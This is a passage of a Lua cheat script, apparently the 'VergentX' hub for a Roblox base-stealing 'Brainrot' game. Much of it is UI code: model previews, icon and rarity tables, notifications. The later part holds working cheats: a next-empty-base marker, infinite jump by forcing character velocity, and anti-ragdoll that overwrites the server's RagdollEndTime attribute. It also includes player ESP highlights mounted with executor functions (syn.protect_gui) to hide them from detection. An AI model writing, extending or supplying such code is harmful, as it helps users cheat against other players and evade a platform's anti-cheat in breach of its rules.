                    local okD, d = pcall(function() return (desc:GetPivot().Position - podiumPos).Magnitude end)
                    if okD and d < bestDist then bestDist = d; found = desc end
                else
                    found = desc
                    break
                end
            end
        end
        if not found and podium then
            for _, desc in ipairs(podium:GetDescendants()) do
                if desc:IsA("Model") and desc.Name ~= "Claim" and desc.Name ~= "Base"
                    and desc.Name ~= "Decorations" then
                    if desc:FindFirstChildWhichIsA("BasePart", true) then found = desc; break end
                end
            end
        end
        if not found and podiumPos then
            pcall(function() LP:RequestStreamAroundAsync(podiumPos, 0.5) end)
        end
    end)
    return found
end

local function createAnimalPreview(parent, animalName, size, altName, petLike)
    local template = VergentXFindLiveAnimalModel(petLike)

    if not template and AnimalModels then
        template = VergentXFindAnimalTemplate(AnimalModels, animalName)
        if not template and altName then template = VergentXFindAnimalTemplate(AnimalModels, altName) end

        if not template then
            local want = tostring(animalName or ""):lower()
            local want2 = altName and tostring(altName):lower() or nil
            if #want >= 3 or (want2 and #want2 >= 3) then
                pcall(function()
                    for _, desc in ipairs(AnimalModels:GetDescendants()) do
                        if desc:IsA("Model") then
                            local dn = desc.Name:lower()
                            if dn == want or dn == want2
                                or (#want >= 4 and (dn:find(want, 1, true) or want:find(dn, 1, true)))
                                or (want2 and #want2 >= 4 and (dn:find(want2, 1, true) or want2:find(dn, 1, true))) then
                                template = desc
                                break
                            end
                        end
                    end
                end)
            end
        end
    end

    if template and not (template:IsA("Model") or template:IsA("BasePart")) then
        template = template:FindFirstChildWhichIsA("Model") or template:FindFirstChildWhichIsA("BasePart")
            or template:FindFirstChildWhichIsA("Model", true) or template:FindFirstChildWhichIsA("BasePart", true)
    end
    if not template then return nil end

    local viewport = Instance.new("ViewportFrame")
    viewport.Size = size or UDim2.new(0, 40, 0, 40)
    viewport.BackgroundTransparency = 1
    viewport.BorderSizePixel = 0
    viewport.Ambient = Color3.fromRGB(200, 200, 200)
    viewport.LightColor = Color3.fromRGB(255, 255, 255)
    viewport.LightDirection = Vector3.new(-1, -1, -1)
    viewport.Parent = parent

    local worldModel = Instance.new("WorldModel")
    worldModel.Parent = viewport

    local camera = Instance.new("Camera")
    viewport.CurrentCamera = camera
    camera.Parent = viewport

    local clone = VergentXCloneForViewport(template)
    if not clone then viewport:Destroy(); return nil end

    if clone:IsA("Model") and clone.PrimaryPart then
        clone:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))
    elseif clone:IsA("BasePart") then
        clone.CFrame = CFrame.new(0, 0, 0)
    else
        pcall(function() clone:PivotTo(CFrame.new()) end)
    end

    clone.Parent = worldModel

    local cPrimary = clone:IsA("Model") and (clone.PrimaryPart or clone:FindFirstChildWhichIsA("BasePart", true))
        or (clone:IsA("BasePart") and clone or nil)
    if not cPrimary then viewport:Destroy(); return nil end

    local esize
    local okE = pcall(function() esize = clone:GetExtentsSize() end)
    if not okE or not esize then esize = cPrimary.Size or Vector3.new(3, 3, 3) end
    local maxDim = math.max(esize.X, esize.Y, esize.Z)
    if maxDim < 1 then maxDim = 3 end

    local frontDir = cPrimary.CFrame.LookVector
    local rightDir = cPrimary.CFrame.RightVector
    local viewDir = (frontDir - rightDir).Unit
    local distance = maxDim * 1.24
    local height = esize.Y * 0.15

    local camPos = cPrimary.Position + (viewDir * distance) + Vector3.new(0, height, 0)
    camera.CFrame = CFrame.new(camPos, cPrimary.Position)
    camera.FieldOfView = 60

    pcall(function()
        if clone:IsA("BasePart") then clone.Anchored = true end
        for _, d in ipairs(clone:GetDescendants()) do
            if d:IsA("BasePart") then d.Anchored = true end
        end
    end)

    return viewport
end
_G.VXCreateAnimalPreview = createAnimalPreview

local VXIcons = {}
do
    local _MutData, _TraitData, _loaded = nil, nil, false
    local function _ensure()
        if _loaded then return end
        _loaded = true
        pcall(function()
            local datas = ReplicatedStorage:FindFirstChild("Datas")
            if datas then
                local m = datas:FindFirstChild("Mutations")
                if m then _MutData = require(m) end
                local shared = ReplicatedStorage:FindFirstChild("Shared")
                local t = datas:FindFirstChild("Traits") or (shared and shared:FindFirstChild("Traits"))
                if t then _TraitData = require(t) end
            end
        end)
    end
    local function _pick(data)
        if type(data) ~= "table" then return nil end
        local v = data.Icon or data.Image or data.AssetId or data.ImageId
        if type(v) == "number" then return "rbxassetid://" .. v end
        return v
    end

    local MUT_FALLBACK = {
        ["Gold"]="rbxassetid://136133057822407", ["Diamond"]="rbxassetid://100875709547015",
        ["Bloodrot"]="rbxassetid://75212036784031", ["Rainbow"]="rbxassetid://83078714090192",
        ["Candy"]="rbxassetid://84797673698685", ["Lava"]="rbxassetid://70800471498231",
        ["Galaxy"]="rbxassetid://139331671405138", ["YinYang"]="rbxassetid://112996178302302",
        ["Yin Yang"]="rbxassetid://112996178302302", ["Radioactive"]="rbxassetid://134809510446754",
        ["Cursed"]="rbxassetid://139160534192980", ["Divine"]="rbxassetid://117437279650650",
        ["Cyber"]="rbxassetid://91596580591665",
    }
    local TRAIT_FALLBACK = {
        ["10B"]="rbxassetid://134655415681926", ["26"]="rbxassetid://80468035315420",
        [":3"]="rbxassetid://108293878529172", ["Blue Balloon"]="rbxassetid://128841931686463",
        ["Blue Egg"]="rbxassetid://109212886335786", ["Brazil"]="rbxassetid://75650816341229",
        ["Bubblegum"]="rbxassetid://100601425541874", ["Bunny Ears"]="rbxassetid://118516289496954",
        ["Chocolate"]="rbxassetid://81641382604997", ["Claws"]="rbxassetid://104964195846833",
        ["Cometstruck"]="rbxassetid://127455440418221", ["Disco"]="rbxassetid://82620342632406",
        ["Explosive"]="rbxassetid://97725744252608", ["Fire"]="rbxassetid://118283346037788",
        ["Fireworks"]="rbxassetid://121100427764858", ["Galactic"]="rbxassetid://99181785766598",
        ["Glitched"]="rbxassetid://121332433272976", ["Granny"]="rbxassetid://73467619616299",
        ["Green Balloon"]="rbxassetid://75222826429094", ["Green Egg"]="rbxassetid://94602857440295",
        ["Halo"]="rbxassetid://98316436141359", ["Indonesia"]="rbxassetid://93350414974589",
        ["Jackolantern Pet"]="rbxassetid://97054765273857", ["John Pork"]="rbxassetid://117176397136731",
        ["Lightning"]="rbxassetid://139729696247144", ["Lucky"]="rbxassetid://124098467754457",
        ["Matteo Hat"]="rbxassetid://115664804212096", ["Meowl"]="rbxassetid://114748221761549",
        ["Nyan"]="rbxassetid://104229924295526", ["Orange Balloon"]="rbxassetid://83111173051279",
        ["Orange Egg"]="rbxassetid://76307362192037", ["Paint"]="rbxassetid://119591742504251",
        ["Pink Balloon"]="rbxassetid://114128099162490", ["Pink Egg"]="rbxassetid://133939661230277",
        ["RIP Gravestone"]="rbxassetid://123115843719383", ["Rainbow Balloon"]="rbxassetid://112821854659961",
        ["Red Balloon"]="rbxassetid://119661964026012", ["Reindeer Pet"]="rbxassetid://70894779883038",
        ["Rose"]="rbxassetid://135489065859287", ["Santa Hat"]="rbxassetid://88375043733582",
        ["Shark Fin"]="rbxassetid://104985313532149", ["Skeleton"]="rbxassetid://89591838221335",
        ["Skibidi"]="rbxassetid://83384385019272", ["Sleepy"]="rbxassetid://115001117876534",
        ["Snowy"]="rbxassetid://83627475909869", ["Sombrero"]="rbxassetid://95128039793845",
        ["Spider"]="rbxassetid://117478971325696", ["Strawberry"]="rbxassetid://84731118566493",
        ["Taco"]="rbxassetid://89041930759464", ["Tie"]="rbxassetid://103610037004911",
        ["UFO"]="rbxassetid://110910518481052", ["Wet"]="rbxassetid://78474194088770",
        ["Witch Hat"]="rbxassetid://123964048606874", ["Zombie"]="rbxassetid://110723387483939",
    }
    local MUT_COLOR = {
        Gold        = Color3.fromRGB(237, 178, 0),   Diamond     = Color3.fromRGB(37, 196, 254),
        Bloodrot    = Color3.fromRGB(178, 20, 44),   Rainbow     = Color3.fromRGB(255, 120, 190),
        Candy       = Color3.fromRGB(255, 105, 180), Lava        = Color3.fromRGB(255, 105, 30),
        Galaxy      = Color3.fromRGB(160, 90, 255),  YinYang     = Color3.fromRGB(214, 216, 226),
        Radioactive = Color3.fromRGB(130, 255, 60),  Cursed      = Color3.fromRGB(255, 55, 55),
        Divine      = Color3.fromRGB(255, 226, 128), Cyber       = Color3.fromRGB(90, 220, 255),
    }
    local _mutCache, _traitCache, _colorCache = {}, {}, {}

    function VXIcons.MutationColor(name)
        if not name or name == "" or name == "None" or name == "Normal" then return nil end
        local c = _colorCache[name]
        if c ~= nil then return c or nil end
        _ensure()
        local col
        if _MutData and type(_MutData[name]) == "table" then
            local mc = _MutData[name].MainColor or _MutData[name].Color or _MutData[name].PrimaryColor
            if typeof(mc) == "Color3" then col = mc end
        end
        col = col or MUT_COLOR[name]
        _colorCache[name] = col or false
        return col
    end
    function VXIcons.Mutation(name)
        if not name or name == "" or name == "None" or name == "Normal" then return "" end
        local c = _mutCache[name]; if c ~= nil then return c end
        _ensure()
        local icon = (_MutData and _pick(_MutData[name]))
            or (name == "YinYang" and _MutData and _pick(_MutData["Yin Yang"]))
            or MUT_FALLBACK[name] or ""
        _mutCache[name] = icon
        return icon
    end
    function VXIcons.Trait(name)
        if not name or name == "" or name == "None" then return "" end
        local c = _traitCache[name]; if c ~= nil then return c end
        _ensure()
        local icon = (_TraitData and _pick(_TraitData[name])) or TRAIT_FALLBACK[name] or ""
        _traitCache[name] = icon
        return icon
    end

    function VXIcons.SplitTraits(v)
        local out = {}
        if type(v) == "table" then
            for _, t in ipairs(v) do
                if type(t) == "string" and t ~= "" and t ~= "None" then out[#out + 1] = t end
            end
            return out
        end
        if type(v) ~= "string" or v == "" or v == "None" then return out end
        for t in v:gmatch("[^,]+") do
            t = t:match("^%s*(.-)%s*$")
            if t ~= "" and t ~= "None" then out[#out + 1] = t end
        end
        return out
    end
end
_G.VXIcons = VXIcons

local VXRarity = {}
do
    local STATIC = {
        Common    = Color3.fromRGB(64, 214, 74),
        Uncommon  = Color3.fromRGB(108, 206, 128),
        Rare      = Color3.fromRGB(72, 148, 255),
        Epic      = Color3.fromRGB(190, 96, 246),
        Legendary = Color3.fromRGB(255, 214, 72),
        Mythic    = Color3.fromRGB(231, 56, 61),
        ["Brainrot God"] = Color3.fromRGB(255, 104, 138),
        Secret    = Color3.fromRGB(236, 237, 242),
        OG        = Color3.fromRGB(255, 214, 92),
    }

    local function rainbowSeq(phase)
        local kp, N = {}, 10
        for i = 0, N do
            local pos = i / N
            kp[i + 1] = ColorSequenceKeypoint.new(pos, Color3.fromHSV((pos - phase) % 1, 0.82, 1))
        end
        return ColorSequence.new(kp)
    end
    local function waveSeq(phase, lo, hi)
        local kp, N = {}, 10
        for i = 0, N do
            local pos = i / N
            local w = math.sin((pos - phase) * math.pi * 2) * 0.5 + 0.5
            kp[i + 1] = ColorSequenceKeypoint.new(pos, lo:Lerp(hi, w))
        end
        return ColorSequence.new(kp)
    end
    local function ogSeq(phase, lo, hi)
        local kp, N, HW, FREQ = {}, 19, 0.12, 2
        for i = 0, N do
            local pos = i / N
            local d = ((pos - phase) * FREQ) % 1
            local dist = math.min(d, 1 - d)
            local w = math.clamp(dist / HW, 0, 1)
            w = w * w * (3 - 2 * w)
            kp[i + 1] = ColorSequenceKeypoint.new(pos, lo:Lerp(hi, w))
        end
        return ColorSequence.new(kp)
    end

    local SECRET_LO, SECRET_HI = Color3.fromRGB(40, 40, 48), Color3.fromRGB(248, 249, 252)
    local OG_LO, OG_HI = Color3.fromRGB(16, 11, 3), Color3.fromRGB(255, 190, 70)
    local ANIM = {
        ["Brainrot God"] = { kind = "rainbow", rot = 0,  speed = 0.28, build = function(p) return rainbowSeq(p) end },
        ["Secret"]       = { kind = "secret",  rot = 90, speed = 0.60, build = function(p) return waveSeq(p, SECRET_LO, SECRET_HI) end },
        ["OG"]           = { kind = "og",      rot = 90, speed = 0.45, build = function(p) return ogSeq(p, OG_LO, OG_HI) end },
    }
    local reg = {}
    local started = false

    local function _gradVisible(lbl)
        local node, hops = lbl, 0
        while node and hops < 10 do
            if node:IsA("GuiObject") then
                if not node.Visible then return false end
            elseif node:IsA("LayerCollector") then
                return node.Enabled
            else
                return true
            end
            node = node.Parent
            hops = hops + 1
        end
        return true
    end

    local RATE = 1 / 30
    local _lcOf = setmetatable({}, { __mode = "k" })
    local function layerOf(lbl)
        local lc = _lcOf[lbl]
        if lc and lc.Parent then return lc end
        local node, hops = lbl, 0
        while node and hops < 12 do
            if node:IsA("LayerCollector") then _lcOf[lbl] = node; return node end
            node = node.Parent
            hops = hops + 1
        end
        return nil
    end

    local function ensureLoop()
        if started then return end
        started = true
        local acc = 0
        vxBind(RunService.Heartbeat, function(dt)
            acc = acc + dt
            if acc < RATE then return end
            acc = 0
            if next(reg) == nil then return end
            local t = os.clock()
            local cache
            for grad, info in pairs(reg) do
                local lbl = grad.Parent
                if not lbl then
                    reg[grad] = nil
                else
                    local lc = layerOf(lbl)
                    if (lc == nil or lc.Enabled) and _gradVisible(lbl) then
                        cache = cache or {}
                        local seq = cache[info.kind]
                        if not seq then
                            seq = info.build((t * info.speed) % 1)
                            cache[info.kind] = seq
                        end
                        grad.Color = seq
                    end
                end
            end
        end)
    end

    function VXRarity.Color(word)
        return STATIC[word] or Color3.fromRGB(190, 193, 200)
    end

    function VXRarity.Apply(label, word)
        if not label then return end
        label.RichText = true
        local shine = label:FindFirstChild("VergentX_TextShine")
        if shine then shine:Destroy() end
        local anim = ANIM[word]
        local grad = label:FindFirstChild("VXRarityGrad")
        if anim then
            label.TextColor3 = Color3.fromRGB(255, 255, 255)
            if not grad then
                grad = Instance.new("UIGradient")
                grad.Name = "VXRarityGrad"
                grad.Parent = label
            end
            grad.Rotation = anim.rot
            grad.Offset = Vector2.new(0, 0)
            grad.Color = anim.build(0)
            reg[grad] = anim
            ensureLoop()
        else
            if grad then reg[grad] = nil; grad:Destroy() end
            label.TextColor3 = STATIC[word] or Color3.fromRGB(190, 193, 200)
        end
    end
end
_G.VXRarity = VXRarity

local VergentXNotifStack = {}
local NOTIF_STACK_GAP = 7
local NOTIF_SCALE = 0.85
local VX_LOGO_ASSET = "rbxassetid://126669742812836"

local function reflowNotifs()
    for i = #VergentXNotifStack, 1, -1 do
        local e = VergentXNotifStack[i]
        if not (e.frame and e.frame.Parent) then
            table.remove(VergentXNotifStack, i)
        end
    end
    if #VergentXNotifStack == 0 then return end

    local inset = 36
    pcall(function() inset = game:GetService("GuiService"):GetGuiInset().Y end)

    local hudTop = nil
    local hud = VXGui:FindFirstChild(_vxName("VergentXStatusHUD"))
    if hud then
        local mc = hud:FindFirstChild("VergentX_MainContainer")
        if mc and mc.AbsoluteSize.Y > 0 then
            hudTop = mc.AbsolutePosition.Y
            local respects = true
            pcall(function() respects = not hud.IgnoreGuiInset end)
            if respects then hudTop = hudTop + inset end
        end
    end
    if not hudTop then
        local vpY = 0
        pcall(function()
            local cam = Workspace.CurrentCamera
            if cam then vpY = cam.ViewportSize.Y end
        end)
        local cfgY = (CONFIG.HUB_POS and CONFIG.HUB_POS[3]) or 0.08
        if vpY > inset then hudTop = cfgY * (vpY - inset) + inset end
    end

    local TOP_MARGIN = 2
    local HUD_GAP = 10

    local totalH = 0
    for i, e in ipairs(VergentXNotifStack) do
        totalH = totalH + e.height
        if i < #VergentXNotifStack then totalH = totalH + NOTIF_STACK_GAP end
    end

    local y = TOP_MARGIN
    if hudTop then
        local above = hudTop - HUD_GAP - totalH
        if above > y then y = above end
    end
    for _, e in ipairs(VergentXNotifStack) do
        if y < 0 then y = 0 end
        TweenService:Create(e.frame, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Position = UDim2.new(0.5, 0, 0, y)
        }):Play()
        y = y + e.height + NOTIF_STACK_GAP
    end
end
_G.VXReflowNotifs = reflowNotifs

local function _removeNotifByType(ntype)
    if ntype == nil then return end
    for i = #VergentXNotifStack, 1, -1 do
        local e = VergentXNotifStack[i]
        if e.ntype == ntype then
            table.remove(VergentXNotifStack, i)
            pcall(function() if e.sg and e.sg.Parent then e.sg:Destroy() end end)
        end
    end
end

local function ShowNotification(title, text, ntype)
    ntype = ntype or title
    local NOTIF_WIDTH = 300
    local NOTIF_HEIGHT = 54
    local DURATION = 3.5

    _removeNotifByType(ntype)

    local sg = Instance.new("ScreenGui")
    sg.Name = _vxName("VergentXNotif")
    sg.ResetOnSpawn = false
    sg.DisplayOrder = 50002
    sg.IgnoreGuiInset = true
    mountGui(sg)

    local f = Instance.new("Frame", sg)
    f.Size = UDim2.new(0, NOTIF_WIDTH, 0, NOTIF_HEIGHT)
    f.AnchorPoint = Vector2.new(0.5, 0)
    f.Position = UDim2.new(0.5, 0, 0, -80)
    local nGrad = applyMarble(f); nGrad.Rotation = 0
    f.BackgroundTransparency = 0.08
    f.BorderSizePixel = 0
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 10)
    Instance.new("UIScale", f).Scale = NOTIF_SCALE

    local st = Instance.new("UIStroke", f)
    st.Thickness = 0.8
    st.Transparency = 0.35
    st.Color = Color3.fromRGB(6, 6, 8)
    st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    local accent = Instance.new("Frame", f)
    accent.Size = UDim2.new(0, 3, 1, -14)
    accent.Position = UDim2.new(0, 6, 0, 7)
    accent.BorderSizePixel = 0
    accent.BackgroundColor3 = Color3.fromRGB(204, 164, 72)
    Instance.new("UICorner", accent).CornerRadius = UDim.new(1, 0)
    gradient(accent, ColorSequence.new({
        ColorSequenceKeypoint.new(0, Theme.SilverHi),
        ColorSequenceKeypoint.new(1, Theme.GoldLo),
    }), 90)

    local logoBox = Instance.new("Frame", f)
    logoBox.Size = UDim2.new(0, 34, 0, 34)
    logoBox.Position = UDim2.new(0, 15, 0.5, -17)
    logoBox.BackgroundColor3 = Color3.fromRGB(13, 13, 15)
    logoBox.BackgroundTransparency = 0.1
    logoBox.BorderSizePixel = 0
    logoBox.ClipsDescendants = true
    Instance.new("UICorner", logoBox).CornerRadius = UDim.new(0, 8)
    local logoStroke = Instance.new("UIStroke", logoBox)
    logoStroke.Color = Color3.fromRGB(6, 6, 8)
    logoStroke.Thickness = 1
    logoStroke.Transparency = 0.4
    logoStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    local logo = Instance.new("ImageLabel", logoBox)
    logo.Image = VX_LOGO_ASSET
    logo.BackgroundTransparency = 1
    logo.Size = UDim2.new(1, 0, 1, 0)
    logo.ScaleType = Enum.ScaleType.Crop
    Instance.new("UICorner", logo).CornerRadius = UDim.new(0, 8)

    local t1 = Instance.new("TextLabel", f)
    t1.Size = UDim2.new(1, -74, 0, 16)
    t1.Position = UDim2.new(0, 58, 0, 8)
    t1.BackgroundTransparency = 1
    t1.Text = tostring(title)
    t1.Font = Enum.Font.Gotham
    t1.TextSize = 12
    t1.TextColor3 = Color3.fromRGB(222, 224, 228)
    t1.TextXAlignment = Enum.TextXAlignment.Left
    t1.TextTruncate = Enum.TextTruncate.AtEnd

    local t2 = Instance.new("TextLabel", f)
    t2.Size = UDim2.new(1, -74, 0, 14)
    t2.Position = UDim2.new(0, 58, 0, 26)
    t2.BackgroundTransparency = 1
    t2.Text = tostring(text)
    t2.Font = Enum.Font.Gotham
    t2.TextSize = 10
    t2.TextColor3 = Color3.fromRGB(186, 189, 196)
    t2.TextXAlignment = Enum.TextXAlignment.Left
    t2.TextTruncate = Enum.TextTruncate.AtEnd
    textShine(t1)
    textShine(t2)

    local progressContainer = Instance.new("Frame", f)
    progressContainer.Size = UDim2.new(1, -16, 0, 2)
    progressContainer.Position = UDim2.new(0, 8, 1, -5)
    progressContainer.BackgroundColor3 = Color3.fromRGB(38, 39, 44)
    progressContainer.BackgroundTransparency = 0.35
    progressContainer.BorderSizePixel = 0
    Instance.new("UICorner", progressContainer).CornerRadius = UDim.new(1, 0)

    local progressBar = Instance.new("Frame", progressContainer)
    progressBar.Size = UDim2.new(1, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(204, 164, 72)
    progressBar.BorderSizePixel = 0
    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(1, 0)
    gradient(progressBar, ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 118, 48)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(204, 164, 72)),
    }))

    local entry = { frame = f, width = NOTIF_WIDTH, height = NOTIF_HEIGHT * NOTIF_SCALE, sg = sg, ntype = ntype }
    table.insert(VergentXNotifStack, entry)
    reflowNotifs()

    TweenService:Create(progressBar, TweenInfo.new(DURATION, Enum.EasingStyle.Linear), {
        Size = UDim2.new(0, 0, 1, 0)
    }):Play()

    task.delay(DURATION, function()
        TweenService:Create(f, TweenInfo.new(0.2), { Position = UDim2.new(0.5, 0, 0, -80) }):Play()
        task.wait(0.21)
        for i = #VergentXNotifStack, 1, -1 do
            if VergentXNotifStack[i] == entry then table.remove(VergentXNotifStack, i) end
        end
        if sg.Parent then sg:Destroy() end
        reflowNotifs()
    end)
end
_G.VXNotify = ShowNotification

local Brainrots = { count = 0 }

local F = {}

do
    if _G.__VXNextBaseCleanup then pcall(_G.__VXNextBaseCleanup) end

    local BASE_POSITIONS = {
        Vector3.new(-342.439, 10.399, 113.107),
        Vector3.new(-342.439, 10.465,   6.107),
        Vector3.new(-476.752, 10.465, 114.107),
        Vector3.new(-476.752, 10.465,   7.107),
        Vector3.new(-342.440, 10.464, 220.107),
        Vector3.new(-476.752, 10.465, 221.107),
        Vector3.new(-342.439, 10.465,-100.893),
        Vector3.new(-476.752, 10.465, -99.893),
    }
    local MATCH_TOL = 6
    local EMPTY_TEXT = "Empty Base"
    local ARROW = utf8.char(0x2B07)

    local enabled = CONFIG.BASE_DETECTOR == true
    local bases, connected, conns = {}, {}, {}

    local function baseIndexFor(model)
        local ok, cf = pcall(function() return (model:GetBoundingBox()) end)
        if not ok then return nil end
        local p, bestI, bestD = cf.Position
        for i, bp in ipairs(BASE_POSITIONS) do
            local dx, dz = p.X - bp.X, p.Z - bp.Z
            local d = math.sqrt(dx * dx + dz * dz)
            if not bestD or d < bestD then bestI, bestD = i, d end
        end
        return (bestD and bestD <= MATCH_TOL) and bestI or nil
    end

    local anchorPart = Instance.new("Part")
    anchorPart.Name = "__VXNextBaseAnchor"
    anchorPart.Anchored, anchorPart.CanCollide, anchorPart.CanQuery, anchorPart.CanTouch = true, false, false, false
    anchorPart.Transparency = 1
    anchorPart.Size = Vector3.new(1, 1, 1)
    anchorPart:SetAttribute("__VXESP", true)
    anchorPart.Parent = Workspace

    local bb = Instance.new("BillboardGui")
    bb.Name = "NextBaseBillboard"
    bb.Adornee = anchorPart
    bb.Size = UDim2.fromOffset(460, 96)
    bb.StudsOffset = Vector3.new(0, 12, 0)
    bb.MaxDistance = math.huge
    bb.AlwaysOnTop = true
    bb.LightInfluence = 0
    bb.Enabled = false
    bb.Parent = anchorPart

    local top = Instance.new("TextLabel", bb)
    top.BackgroundTransparency = 1
    top.Size = UDim2.new(1, 0, 1, 0)
    top.Font = Enum.Font.GothamBold
    top.Text = ARROW .. "  NEXT BASE  " .. ARROW
    top.TextScaled = true
    top.TextColor3 = Theme.GoldHi
    top.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    top.TextStrokeTransparency = 0.25
    gradient(top, ColorSequence.new({
        ColorSequenceKeypoint.new(0, Theme.SilverHi),
        ColorSequenceKeypoint.new(0.5, Theme.GoldHi),
        ColorSequenceKeypoint.new(1, Theme.GoldLo),
    }), 20)

    local function isEmpty(label)
        return (label.Text:gsub("^%s+", ""):gsub("%s+$", "")) == EMPTY_TEXT
    end

    local function recompute()
        if not enabled then
            bb.Enabled = false
            return
        end
        local targetIdx
        for i = 1, #BASE_POSITIONS do
            local b = bases[i]
            if b and b.label and isEmpty(b.label) then targetIdx = i break end
        end
        if targetIdx then
            anchorPart.CFrame = bases[targetIdx].cf
            bb.Enabled = true
        else
            bb.Enabled = false
        end
    end

    local function connectLabel(label)
        if connected[label] then return end
        connected[label] = true
        table.insert(conns, label:GetPropertyChangedSignal("Text"):Connect(recompute))
    end

    local function scanBases()
        for _, plot in ipairs(Plots:GetChildren()) do
            local sign  = plot:FindFirstChild("PlotSign")
            local model = sign and sign:FindFirstChild("Model")
            local gui   = sign and sign:FindFirstChild("SurfaceGui")
            local fr    = gui and gui:FindFirstChild("Frame")
            local label = fr and fr:FindFirstChild("TextLabel")
            if model and label then
                local idx = baseIndexFor(model)
                if idx then
                    bases[idx] = { label = label, cf = (select(1, model:GetBoundingBox())) }
                    connectLabel(label)
                end
            end
        end
        recompute()
    end

    scanBases()

    local rescanDirty = false
    local detectorAlive = true
    table.insert(conns, Plots.DescendantAdded:Connect(function(d)
        if d:IsA("TextLabel") then rescanDirty = true end
    end))
    table.insert(conns, Plots.ChildAdded:Connect(function() rescanDirty = true end))

    task.spawn(function()
        while detectorAlive do
            task.wait(0.5)
            if not vxAlive() then return end
            if rescanDirty and enabled then
                rescanDirty = false
                pcall(scanBases)
            end
        end
    end)

    task.spawn(function()
        while detectorAlive do
            task.wait(0.1)
            if not vxAlive() then return end
            if enabled and bb.Enabled then
                local pulse = (math.sin(tick() * 2.2) + 1) / 2
                top.TextTransparency = 0.12 - pulse * 0.12
            end
        end
    end)

    F.setBaseDetector = function(on)
        enabled = on and true or false
        CONFIG.BASE_DETECTOR = enabled
        if enabled then recompute() else bb.Enabled = false end
        saveConfig()
    end

    _G.__VXNextBaseCleanup = function()
        detectorAlive = false
        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
        if anchorPart then pcall(function() anchorPart:Destroy() end) end
        _G.__VXNextBaseCleanup = nil
    end
end

do
    local enabled = CONFIG.INFINITE_JUMP == true

    local function boost(power)
        if not enabled then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            root.Velocity = Vector3.new(root.Velocity.X, power, root.Velocity.Z)
        end
    end

    vxBind(UserInputService.JumpRequest, function() boost(50) end)

    local holdPressed, holdActive = false, false

    vxBind(UserInputService.InputBegan, function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard
        and input.KeyCode == Enum.KeyCode.Space
        and not UserInputService:GetFocusedTextBox() then
            holdPressed = true
            task.delay(0.12, function()
                if holdPressed then
                    holdActive = true
                    boost(50)
                end
            end)
        end
    end)

    vxBind(UserInputService.InputEnded, function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Space then
            holdPressed = false
            holdActive = false
        end
    end)

    vxBind(RunService.Heartbeat, function()
        if holdActive then boost(50) end
    end)

    F.setInfiniteJump = function(on)
        enabled = on and true or false
        CONFIG.INFINITE_JUMP = enabled
        saveConfig()
    end
end

do
    local enabled = false
    local conns = {}

    local function cleanRagdoll(char)
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")

        if hum then
            local s = hum:GetState()
            if s == Enum.HumanoidStateType.Physics
            or s == Enum.HumanoidStateType.Ragdoll
            or s == Enum.HumanoidStateType.FallingDown then
                if hum.Health > 0 then
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end
            end
            Workspace.CurrentCamera.CameraSubject = hum
        end

        if root then
            root.Anchored = false
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end

        for _, d in ipairs(char:GetDescendants()) do
            if d:IsA("BallSocketConstraint")
            or (d:IsA("Attachment") and d.Name:find("RagdollAttachment")) then
                d:Destroy()
            elseif d:IsA("Motor6D") and d.Enabled == false then
                d.Enabled = true
            end
        end
    end

    F.setAntiRagdoll = function(on)
        enabled = on and true or false
        CONFIG.ANTI_RAGDOLL = enabled

        for _, c in pairs(conns) do pcall(function() c:Disconnect() end) end
        conns = {}

        if enabled then
            table.insert(conns, vxBind(RunService.Heartbeat, function()
                if not enabled then return end
                local c = LP.Character
                if not c then return end
                local hum = c:FindFirstChildOfClass("Humanoid")
                local root = c:FindFirstChild("HumanoidRootPart")
                if not (hum and root) then return end

                local s = hum:GetState()
                local ragdolled = (s == Enum.HumanoidStateType.Physics
                    or s == Enum.HumanoidStateType.Ragdoll
                    or s == Enum.HumanoidStateType.FallingDown)

                local endTime = LP:GetAttribute("RagdollEndTime")
                if endTime and (endTime - Workspace:GetServerTimeNow()) > 0 then
                    ragdolled = true
                end

                if ragdolled then
                    pcall(function()
                        LP:SetAttribute("RagdollEndTime", Workspace:GetServerTimeNow())
                    end)
                    cleanRagdoll(c)
                end
            end))

            table.insert(conns, vxBind(LP.CharacterAdded, function(char)
                task.wait(0.5)
                if enabled then cleanRagdoll(char) end
            end))
        end

        saveConfig()
    end
end

do
    local playerESPEnabled = false
    local playerESPData = {}

    local ESP_GROUP_COLORS = {
        Owner = Color3.fromRGB(255, 70, 90),
    }

    local function espMount(inst)
        pcall(function()
            if inst:IsA("LayerCollector") then
                if syn and syn.protect_gui then syn.protect_gui(inst) end
                if typeof(protectgui) == "function" then protectgui(inst) end
            end
        end)
        inst.Parent = VXGui
        return inst
    end

    local function espHrp()
        local char = LP.Character
        return char and char:FindFirstChild("HumanoidRootPart") or nil
    end

    local function espGroupTags(player)
        local tags = {}
        if CONFIG.BASE_OWNER_ESP == true and _G.VXBaseOwnerUserId == player.UserId then
            tags[#tags + 1] = "Owner"
        end
        return tags
    end

    local function createPlayerESP(player)
        if player == LP then return end
        local char = player.Character
        if not char then return end

        local anchorPart = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
        if not anchorPart then return end

        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None end

        local tags = espGroupTags(player)
        local isOwner = (tags[1] == "Owner")
        local accent = isOwner and ESP_GROUP_COLORS.Owner or Theme.GoldHi

        local highlight = Instance.new("Highlight")
        highlight.Name = _vxName("espPlayerHL")
        highlight.Adornee = char
